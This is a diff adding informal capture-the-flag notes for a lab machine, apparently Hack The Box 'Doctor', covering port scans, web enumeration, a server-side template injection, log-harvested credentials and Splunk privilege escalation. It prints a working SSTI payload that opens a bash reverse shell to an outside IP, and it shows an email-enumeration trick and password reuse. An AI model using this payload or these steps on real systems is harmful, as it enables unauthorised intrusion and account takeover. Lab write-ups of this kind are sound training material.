@@ -1,0 +1,84 @@
+---PORT SCAN---
+PORT     STATE SERVICE  VERSION
+22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Doctor
+8089/tcp open  ssl/http Splunkd httpd
+| http-robots.txt: 1 disallowed entry 
+|_/
+|_http-server-header: Splunkd
+|_http-title: splunkd
+| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
+| Not valid before: 2020-09-06T15:57:27
+|_Not valid after:  2023-09-06T15:57:27
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+---GOBUSTER---
+/ (80):
+  /images (Status: 301)
+  /css (Status: 301)
+  /js (Status: 301)
+  /fonts (Status: 301)
+  /server-status (Status: 403)
+  /about.html (Status: 200)
+  /blog.html (Status: 200)
+  /contact.html (Status: 200)
+  /departments.html (Status: 200)
+  /index.html (Status: 200)
+  /services.html (Status: 200)
+
+/ (8089):
+  /services (Status: 401)
+  /robots.txt (Status: 200)
+  /v*
+
+
+---ATTEMPTS---
+all files are the same in 10.10.10.209/ (about, blog, contact and etc)
+admin user was the one to publish posts on 10.10.10.209/blog.html
+Splunk found in 10.10.10.209:8089 is probably a leaked user
+login/pass is sended by a post request with USER:PASS base64ed in html field Authorization: Basic
+found a email info@doctors.htb
+checking for VHR (done!)
+login page found
+account creation enabled
+( Your account has been created, with a time limit of twenty minutes! )
+found a /post/1 page that was posted by admin
+it is possible to find registered emails using the forgot password page (returns 500 if email exists or error message if doesnt)
+http response header:
+  Server: Werkzeug/1.0.1 Python/3.8
+trying sql map in http://doctors.htb/home?page=1 (unsuccessful)
+comment found in html: <!--archive still under beta testing<a class="nav-item nav-link" href="/archive">Archive</a>-->
+the /archive dir:
+  <?xml version="1.0" encoding="UTF-8" ?>
+  <rss version="2.0">
+  <channel>
+    <title>Archive</title>
+    <item><title>25</title></item>
+  </channel>
+    <item><title>asodfijaosidjf</title></item>
+  </channel>
+Werkzeug is a server-side template engine, and it is not sanitize to SSTI, as the title of the posts are written into the xml file in /archive, then everything is easy now
+creating a SSTI with python code to run a reverse shell
+the rshell was done like this:
+  executing a rshell:
+    {{ config.__class__.__init__.__globals__['os'].popen('/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.153/8888 0>&1" ').read()}}
+kudos!
+
+--- PRIV ESC---
+user web is in group adm
+looking through logs doesnt find much
+although there is a file in /var/log/apache2/ called backup that has a password request change:
+  10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] "POST /reset_password?email=Guitar123" 500 453 "http://doctor.htb/reset_password"
+trying 'su shaun' with 'Guitar123'
+kudos!
+cat /home/shaun/user.txt
+
+running linpeas again
+nothing
+
+trying to execute the splunkd privesc exploit with shaun:Guitar123
+kudos!
+
+cat /root/root.txt
